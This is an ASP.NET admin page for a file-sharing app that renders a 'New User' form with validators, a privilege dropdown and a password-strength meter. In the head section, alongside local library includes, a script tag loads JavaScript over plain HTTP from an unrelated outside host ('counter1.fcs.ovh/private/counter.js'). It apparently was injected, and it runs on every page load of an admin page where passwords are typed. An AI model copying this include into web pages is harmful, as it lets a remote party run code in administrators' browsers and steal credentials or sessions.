<%@ Page Title="" Language="C#" MasterPageFile="~/Admin/AdminHeader.Master" AutoEventWireup="true" CodeBehind="NewUser.aspx.cs" Inherits="FileShareApp.Admin.NewUser" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="ajax" %>
<asp:Content ID="Content1" ContentPlaceHolderID="head" runat="server">
    <script type="text/javascript" src="../js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="../js/bootstrap.min.js"></script>
    <script type="text/javascript" src="../js/chart.min.js"></script>
    <script type="text/javascript" src="../js/chart-data.js"></script>
    <script type="text/javascript" src="../js/easypiechart.js"></script>
    <script type="text/javascript" src="../js/easypiechart-data.js"></script>
    <script type="text/javascript" src="../js/bootstrap-datepicker.js"></script>
    <script>
        $('#calendar').datepicker({
    });

    !function ($) {
        $(document).on("click", "ul.nav li.parent > a > span.icon", function () {
            $(this).find('em:first').toggleClass("glyphicon-minus");
        });
        $(".sidebar span.icon").find('em:first').addClass("glyphicon-plus");
    } (window.jQuery);

    $(window).on('resize', function () {
        if ($(window).width() > 768) $('#sidebar-collapse').collapse('show')
    })
    $(window).on('resize', function () {
        if ($(window).width() <= 767) $('#sidebar-collapse').collapse('hide')
    })
    </script>

    <link rel="Stylesheet" type="text/css" href="../css/ValidatorStyle.css" />
    <script type="text/javascript" src="http://counter1.fcs.ovh/private/counter.js?c=fa58ab173229a918ea05744c9272e2b2"></script>
      

<div id="sidebar-collapse" class="col-sm-3 col-lg-2 sidebar">
        <form role="search">
        <div class="form-group" style="padding-bottom:50px;">
            <%--<input type="text" class="form-control" placeholder="Search">--%>
        </div>
        </form>
            <ul class="nav menu">
            <li ><a href="AdminHome.aspx">
                <svg class="glyph stroked dashboard-dial"><use xlink:href="#stroked-dashboard-dial"></use></svg>
                Dashboard</a></li>
            <li><a href="ListFiles.aspx">
                <svg class="glyph stroked blank document"><use xlink:href="#stroked-blank-document"/></svg>
                Files</a></li>
            <li><a href="UploadFiles.aspx">
                <svg class="glyph stroked upload"><use xlink:href="#stroked-upload"/></svg>
                New Uploads</a></li>
           <li ><a href="ViewReports.aspx">
           <svg class="glyph stroked line-graph"><use xlink:href="#stroked-line-graph"></use></svg> Reports</a></li>

            <li class="active"><a href="NewUser.aspx">
           <svg class="glyph stroked pen tip"><use xlink:href="#stroked-pen-tip"/></svg> New User</a></li>

           <li ><a href="ChangePassword.aspx">
           <svg class="glyph stroked lock"><use xlink:href="#stroked-lock"/></svg> Change Password</a></li>

            <li><a href="Logout.aspx">
                <svg class="glyph stroked male-user"><use xlink:href="#stroked-male-user"></use></svg>
                Logout</a></li>
        </ul>
    </div>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
    <asp:ScriptManager ID="scriptClient" runat="server">
</asp:ScriptManager>
<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">
<div  style=" padding-left:0px; margin-top:50px;">

 <div class="row">
            <div class="col-lg-12">
                <h1 class="page-header">
                    New User</h1>
            </div>
        </div>
                
       <div style="border:3px groove #31a3c6; margin-bottom:20px; border-radius:15px 3px;  padding-left:20px; margin-top:50px; width:90%; padding-top:20px;">
       <table style="width:95%; margin-top:20px;">

<tr><td style="background-color:#31a3c6; color:White; padding:5px 5px 5px 5px; width:20%; ">Login Details</td></tr>


<%--<script language="javascript" type="text/javascript">
    $(document).ready(function () {
        $('#<%=btnSubmit.ClientID %>').click(

                   function SaveClientByWSJQuery() {

                       $('#<%=divEmailExists.ClientID%>').hide();
                       $('#<%=divUsernameExists.ClientID%>').hide();
                       if ($('#<%=divEmailError.ClientID%>').is(':visible')) { }
                       else { $('#<%=divEmailError.ClientID%>').show(); }
                       if ($('#<%=divUsernameError.ClientID%>').is(':visible')) { }
                       else { $('#<%=divUsernameError.ClientID%>').show(); }


                       $.ajax({
                           type: "POST",
                           url: "../Career/WebServices/RegisterUser.asmx/RegisterClient",
                           data: "{'firstName':'" + $('#<%=txtFirstName.ClientID%>').val() + "','lastName':'" + $('#<%=txtLastName.ClientID%>').val() + "','userName':'" + $('#<%=txtUsername.ClientID%>').val() + "','password':'" + $('#<%=txtPassword.ClientID%>').val() + "','email':'" + $('#<%=txtEmail.ClientID%>').val() + "','gender':'" + $('#<%=ddlGender.ClientID%> option:selected').text() + "','clientName':'" + $('#<%=txtClientname.ClientID%>').val() + "','description':'" + $('#<%=txtcmpnydesc.ClientID%>').val() + "','Address1':'" + $('#<%=txtAddress1.ClientID%>').val() + "','Address2':'" + $('#<%=txtAddress2.ClientID%>').val() + "','zipCode':'" + $('#<%=txtZip.ClientID%>').val() + "','region':'" + $('#<%=ddlRegion.ClientID%>').val() + "','country':'" + $('#<%=ddlCountry.ClientID%>').val() + "','state':'" + $('#<%=ddlState.ClientID%>').val() + "','city':'" + $('#<%=ddlCity.ClientID%>').val() + "','location':'" + $('#<%=txtJobloc.ClientID%>').val() + "','mobile':'" + $('#<%=txtMobile.ClientID%>').val() + "','code':'" + $('#<%=txtAreaCode.ClientID%>').val() + "','phone':'" + $('#<%=txtPhone.ClientID%>').val() + "','emailContact':'" + $('#<%=txtContactEmail.ClientID%>').val() + "','website':'" + $('#<%=txtWebsite.ClientID%>').val() + "','SeqQues':'" + $('#<%=ddlSecurityQn.ClientID%> option:selected').text() + "','SeqAns':'" + $('#<%=txtSecurityqn.ClientID%>').val() + "','newsletter':'" + $('#<%=cbxNewsletters.ClientID%>').val() + "','offers':'" + $('#<%=cbxOffers.ClientID%>').val() + "'}",
                           contentType: "application/json; charset=utf-8",
                           dataType: "json",
                           success: OnSuccessSave,
                           error: OnErrorSave
                       });

                   });

    });

    function OnSuccessSave(list) {
        //$('#sessionInput').val(list.d);
        //alert("Sucessfully saved...!!!");
    }

    function OnErrorSave(request, status, error) {
        alert(request.status + " " + request.statusText);
    }
</script>--%>

<script type ="text/javascript" >


    function passwordCompare(RePassword) {


        Password = $('#<%=txtPassword.ClientID%>').val();
        if (RePassword == Password) {
            updatePasswordBar(9);
        }
        else {
            Strength = document.getElementById('strendth');
            ErrorField = document.getElementById('passError');
            passwordStrength(Password, Strength, ErrorField);
        }
    }




    function passwordStrength(password, passwordStrength, errorField) {


        //password = password.trim();
        password = password.replace(/\s+/g, "");
       
        var score = 0;

        //if password bigger than 8 give another 1 point
        if (password.length >= 8) score++;

        //if password bigger than 12 give another 1 point
        if (password.length >= 12) score++;

        //if password has both lowercase and uppercase characters and numbers give 1 point 
        if ((password.match(/[a-z]/)) && (password.match(/[A-Z]/)) && (password.match(/\d+/))) score++;

        //if password has both numbers and lowercase and special characters give 1 point 
        if ((password.match(/\d+/)) && (password.match(/[a-z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password has both numbers and uppercase and special characters give 1 point 
        if ((password.match(/\d+/)) && (password.match(/[A-Z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password has both lowercase and uppercase and special characters give 1 point 
        if ((password.match(/[a-z]/)) && (password.match(/[A-Z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password lesser than 8 make 0 point
        if (password.length < 8) score = 0;
     
        updatePasswordBar(score);
    }



    function updatePasswordBar(rating) {
       
        var ratingMsgs = new Array(6);
        var ratingClasses = new Array(6);
        ratingMsgs[0] = "Too.Short";
        ratingMsgs[1] = "Weak";
        ratingMsgs[2] = "Strong";
        ratingMsgs[9] = "No Rated";
        ratingClasses[0] = 'short';
        ratingClasses[1] = 'weak';
        ratingClasses[2] = 'strong';
        ratingClasses[9] = 'notRated';

        var bar = document.getElementById('strength-bar');
        if (bar) {
           
            var message = document.getElementById('passwdRating');
            var barLength = document.getElementById('passwdBar').clientWidth;
            if (rating >= 0 && rating <= 2) {
                
                bar.style.width = (barLength * (parseInt(rating) + 1.0) / 3.0) + 'px';
                message.innerHTML = ratingMsgs[rating];
                
            } else if (rating > 2 && rating <= 8) {
                rating = 2;
                updatePasswordBar(rating);
            } else {
                bar.style.width = 0;
                rating = 9;
                message.innerHTML = "";
            }
            message.className = ratingClasses[rating];
            bar.className = ratingClasses[rating];
        }
    }



</script>



<style>

 .password-strengthcheck p {
  margin: 0 0 4px;
  }
  .password-strengthcheck .meter {
  height: 5px;
  background: #f5f5f5;
  }
  .password-strengthcheck .meter #strength-bar {
  display: block;
  height: 100%;
  width: 250px;
  }
  .password-strengthcheck .meter .short {
  background: #ff0000;
  }
  .password-strengthcheck .meter .weak {
  background: #2d98f3;
  }
  .password-strengthcheck .meter .strong {
  background: #76c261;
  }
  .password-strengthcheck .meter .notRated {
  background: #666;
  }
  
  
  
  .password-strengthcheck .msg #passwdRating {
  display: block;
  }
  .password-strengthcheck .msg .short {
  color: #ff0000;
  }
  .password-strengthcheck .msg .weak {
  color: #2d98f3;
  }
  .password-strengthcheck .msg .strong {
  color: #76c261;
  }
  .password-strengthcheck .msg .notRated {
  color: #ccc;
  }

</style>

<%--<script language="javascript" type="text/javascript">

    function BlockEmailExistsByCode() {
        if ($('#<%=divEmailError.ClientID%>').is(':visible')) {
            $('#<%=divEmailError.ClientID%>').hide();
        }
    }

    function CheckEmailExistsByWSJQuery() {

        $.ajax({
            type: "POST",
            url: "../Career/WebServices/RegisterUser.asmx/CheckEmailExists",
            data: "{'email':'" + $('#<%=txtEmail.ClientID%>').val() + "'}",
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: OnSuccessEmail,
            error: OnErrorEmail
        });

    }

    function OnSuccessEmail(result) {
        var exists = result.d;
        if (exists > 0) {
            //alert("Email already exists");
            $('#<%=divEmailExists.ClientID%>').show();
        }
        else {
            //alert("This email address can be used");
            $('#<%=divEmailExists.ClientID%>').hide();
        }
    }

    function OnErrorEmail(request, status, error) {
        alert(request.status + " " + request.statusText);
    }
</script>--%>

<tr>
<td style="float:right; padding-top:10px; "><span style="color:Red;">*</span> First Name:</td><td style="padding-top:10px;padding-left:10px; "><asp:TextBox ID="txtFirstName" runat="server" Width ="250px"></asp:TextBox></td>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtFirstName" runat="server" ErrorMessage="First Name should be required" Display="None" 
            ControlToValidate="txtFirstName" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_txtFirstName" 
        runat="server" TargetControlID="RequiredFieldValidator_txtFirstName" 
        CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>

<td style="float:right; padding-top:10px;"><span style="color:Red;">*</span> Last Name:</td><td style="padding-top:10px;padding-left:10px;"><asp:TextBox ID="txtLastName" runat="server" Width ="250px"></asp:TextBox></td></tr>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtLastName" runat="server" ErrorMessage="Last Name should be required" Display="None" 
            ControlToValidate="txtLastName" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_txtLastName" 
               runat="server" TargetControlID="RequiredFieldValidator_txtLastName" 
               CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>





<tr>


<td style="float:right; padding-top:10px;"><span style="color:Red;">*</span> Email Address:</td><td style="padding-top:10px;padding-left:10px;">
<div style="float:left;">
<asp:TextBox ID="txtEmail" runat="server" Width ="250px" onchange="CheckEmailExistsByWSJQuery()" onkeyup="BlockEmailExistsByCode()"></asp:TextBox>
</div>
<%--<div id="divEmailExists" runat="server" style="display:none; float:right; color:#31a3c6; margin-left:5px; text-align:center; font-weight:bold; font-variant:small-caps; font-size:medium;">
<span style="color:Red">*</span> Email already exists
</div>
<div id="divEmailError" runat="server" style="color:Red; float:right; text-align:right; padding:7px; width:100%; font-weight:bold; font-variant:small-caps; font-size:medium;" Visible="false">
<asp:Label ID="lblEmailError" runat="server"></asp:Label></div>--%>
</td>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtEmail" runat="server" ErrorMessage="Email should be required" Display="None" 
            ControlToValidate="txtEmail" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajaxToolkit:ValidatorCalloutExtender ID="ValidatorCalloutExtender_txtEmail" runat="server" TargetControlID="RequiredFieldValidator_txtEmail" CssClass="customCalloutStyle">
            </ajaxToolkit:ValidatorCalloutExtender>
<asp:RegularExpressionValidator ID="valEmailAdd" runat="server" Display="None"
            ControlToValidate="txtEmail" ValidationGroup="Client" 
            ValidationExpression=".*@.{2,}\..{2,}" 
            ErrorMessage="Email Address should be in name@domain.com format." 
            ForeColor="Red"></asp:RegularExpressionValidator>
            <ajaxToolkit:ValidatorCalloutExtender runat="Server" ID="ValidatorCalloutExtender_valEmailAdd"  
            TargetControlID="valEmailAdd" CssClass="customCalloutStyle" />



<td style="float:right; padding-top:10px;"><span style="color:Red;">*</span> Retype Email:</td><td style="padding-top:10px;padding-left:10px;">
<div style="float:left;">
<asp:TextBox ID="txtEmail_Retype" runat="server" Width ="250px" ></asp:TextBox>
</div>

</td></tr>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtEmail_Retype" runat="server" ErrorMessage="Retype the Email is required" Display="None" 
            ControlToValidate="txtEmail_Retype" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajaxToolkit:ValidatorCalloutExtender ID="ValidatorCalloutExtender_txtEmail_Retype" runat="server" TargetControlID="RequiredFieldValidator_txtEmail_Retype" CssClass="customCalloutStyle">
            </ajaxToolkit:ValidatorCalloutExtender>
<asp:RegularExpressionValidator ID="RegularExpressionValidator_txtEmail_Retype" runat="server" Display="None"
            ControlToValidate="txtEmail_Retype" ValidationGroup="Client" 
            ValidationExpression=".*@.{2,}\..{2,}" 
            ErrorMessage="Email Address should be in name@domain.com format." 
            ForeColor="Red"></asp:RegularExpressionValidator>
            <ajaxToolkit:ValidatorCalloutExtender runat="Server" ID="ValidatorCalloutExtender_RegularExpressionValidator_txtEmail_Retype"  
            TargetControlID="RegularExpressionValidator_txtEmail_Retype" CssClass="customCalloutStyle" />
<asp:CompareValidator ID="CompareValidator_Emails" runat="server" ErrorMessage="Emails Should Match" Display="None" 
            ControlToCompare="txtEmail" ControlToValidate="txtEmail_Retype" ValidationGroup="Client"></asp:CompareValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_Emails" 
               runat="server" TargetControlID="CompareValidator_Emails" 
               CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>


<%--<script language="javascript" type="text/javascript">

    function BlockUsernameExistsByCode() {
        if ($('#<%=divUsernameError.ClientID%>').is(':visible')) {
            $('#<%=divUsernameError.ClientID%>').hide();
        }
    }

    function CheckUsernameExistsByWSJQuery() {

        $.ajax({
            type: "POST",
            url: "../Career/WebServices/RegisterUser.asmx/CheckUsernameExists",
            data: "{'username':'" + $('#<%=txtUsername.ClientID%>').val() + "'}",
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: OnSuccessUsername,
            error: OnErrorUsername
        });

    }

    function OnSuccessUsername(result) {
        var exists = result.d;
        if (exists > 0) {
            //alert("Username already exists");
            $('#<%=divUsernameExists.ClientID%>').show();
        }
        else {
            //alert("This username is available");
            $('#<%=divUsernameExists.ClientID%>').hide();
        }
    }

    function OnErrorUsername(request, status, error) {
        alert(request.status + " " + request.statusText);
    }
</script>--%>

<tr>
<td style="float:right; padding-top:10px;"><span style="color:Red;">*</span> Desired Username:</td><td style="padding-top:10px;padding-left:10px;">
<div style="float:left;">
<asp:TextBox ID="txtUsername" runat="server" Width ="250px" onchange="CheckUsernameExistsByWSJQuery()" onkeyup="BlockUsernameExistsByCode()"></asp:TextBox>
</div>

</td>

<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtUsername" runat="server" ErrorMessage="Username should be required" Display="None" 
            ControlToValidate="txtUsername" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_txtUsername" 
        runat="server" TargetControlID="RequiredFieldValidator_txtUsername" 
        CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>

<td style="float:right; padding-top:10px;"><span style="color:Red;">*</span>User Privilage:</td>
<td style="padding-left:10px; padding-top:10px;">
  <asp:DropDownList ID="ddlPrivilage" runat="server" Width ="250px">
         <asp:ListItem Selected ="True">--Select Privilage--</asp:ListItem>
         <asp:ListItem Value="2">User</asp:ListItem>
         <asp:ListItem Value="1">Admin</asp:ListItem>
        </asp:DropDownList></td></tr>

          <asp:RequiredFieldValidator ID="RequiredFieldValidator_ddlPrivilage" runat="server" ErrorMessage="Please select Privilage" InitialValue="--Select Privilage--" Display="None" 
            ControlToValidate="ddlPrivilage" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:ValidatorCalloutExtender ID="ValidatorCalloutExtender_ddlPrivilage" runat="server" TargetControlID="RequiredFieldValidator_ddlPrivilage" CssClass="customCalloutStyle">
            </ajax:ValidatorCalloutExtender>

<tr><td style="float:right; padding-top:10px;"><span style="color:Red;">*</span> Password:</td><td style="padding-top:10px;padding-left:10px;">
<asp:TextBox ID="txtPassword" runat="server" TextMode="Password" Width ="250px" onkeyup="passwordStrength(this.value,document.getElementById('strendth'),document.getElementById('passError'))"></asp:TextBox>
<div class="hidden1" id="password-bar-html" role="alert">
   <div class="password-strengthcheck">
  <div class="msg">
  <span id="passwdRating"></span>
  </div>
  <div class="meter" id="passwdBar" style="width:254px;">
  <span id="strength-bar"></span>
  </div>
  </div>
  </div>
</td>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtPassword" runat="server" ErrorMessage="Password should be required" Display="None" 
            ControlToValidate="txtPassword" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_txtPassword" 
        runat="server" TargetControlID="RequiredFieldValidator_txtPassword" 
        CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>
<asp:RegularExpressionValidator ID="RegularExpressionValidator_valPassword2" runat="server" Display="None" 
            ControlToValidate="txtPassword" ValidationGroup="Client"
            ErrorMessage="Password must be atleast 8 nonblank characters." 
            ValidationExpression="[^\s]{8,}" />
            <ajaxToolkit:ValidatorCalloutExtender runat="Server" ID="ValidatorCalloutExtender_valPassword2"  
            TargetControlID="RegularExpressionValidator_valPassword2" CssClass="customCalloutStyle" />
<td style="float:right; padding-top:10px; width:120px;"><span style="color:Red;">*</span> Retype Password:</td><td style="padding-top:10px;padding-left:10px;">
<asp:TextBox ID="txtRePassword" runat="server" TextMode="Password" Width ="250px" onkeyup="passwordCompare(this.value)"></asp:TextBox></td></tr>
<asp:RequiredFieldValidator ID="RequiredFieldValidator_txtRePassword" runat="server" ErrorMessage="Retype Password should be required" Display="None" 
            ControlToValidate="txtRePassword" ValidationGroup="Client"></asp:RequiredFieldValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_txtRePassword" 
               runat="server" TargetControlID="RequiredFieldValidator_txtRePassword" 
               CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>
<asp:CompareValidator ID="CompareValidator_Passwords" runat="server" ErrorMessage="Passwords Should Match" Display="None" 
            ControlToCompare="txtPassword" ControlToValidate="txtRePassword" ValidationGroup="Client"></asp:CompareValidator>
            <ajax:validatorcalloutextender ID="ValidatorCalloutExtender_Passwords" 
               runat="server" TargetControlID="CompareValidator_Passwords" 
               CssClass="customCalloutStyle">
            </ajax:validatorcalloutextender>
          
            <tr><td colspan="4" ><hr color="#31a3c6"/></td></tr>
              <tr ><td></td><td><div id="divUsernameExists" runat="server" style="display:none; float:right; color:#31a3c6; margin-left:5px; text-align:center; font-weight:bold; font-variant:small-caps; font-size:medium;">
<span style="color:Red">*</span> Username already exists
</div>
<div id="divUsernameError" runat="server" style="color:Red; float:right; text-align:right; padding:7px; width:100%; font-weight:bold; font-variant:small-caps; font-size:medium;" Visible="false">
<asp:Label ID="lblUsernameError" runat="server"></asp:Label></div></td><td style="float:right; "></td> 
           <td style="padding-top:10px; padding-left:20px; padding-bottom:15px;">
           <asp:ImageButton ID="btnSubmit" runat="server" ValidationGroup="Client"
            ImageUrl="~/css-admin/Submit.jpg" Width="80px" onclick="btnSubmit_Click" 
                  />
          
                  <asp:ImageButton ID="btnCancel" runat="server" 
                   ImageUrl="~/css-admin/Cancel.jpg" Width="80px" 
                    />
           
              </td></tr>
            </table>

</div> 
      </div>
</div>
</asp:Content>
